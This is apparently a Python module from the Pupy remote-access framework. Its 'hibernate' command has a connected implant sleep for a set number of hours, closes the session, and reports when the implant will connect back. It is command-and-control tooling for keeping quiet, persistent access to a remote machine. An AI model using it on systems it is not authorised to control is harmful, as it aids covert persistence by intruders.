# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from datetime import datetime, timedelta

__class_name__ = "hibernate"


@config(cat="admin")
class hibernate(PupyModule):
    """ Close session during x hours """

    dependencies = ['hibernate']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="hibernate", description=cls.__doc__)
        cls.arg_parser.add_argument('hours', type=int, help='time to sleep (in hours)')

    def run(self, args):
        sleep_secs = self.client.remote('hibernate', 'sleep_time')
        ok = sleep_secs(args.hours)
        if ok:
            connect_back = datetime.now() + timedelta(hours=int(args.hours))
            self.success('Session will be back at %s' % str(connect_back))
            self.client.conn._conn.close()
        else:
            self.error('Failed to hibernate session')
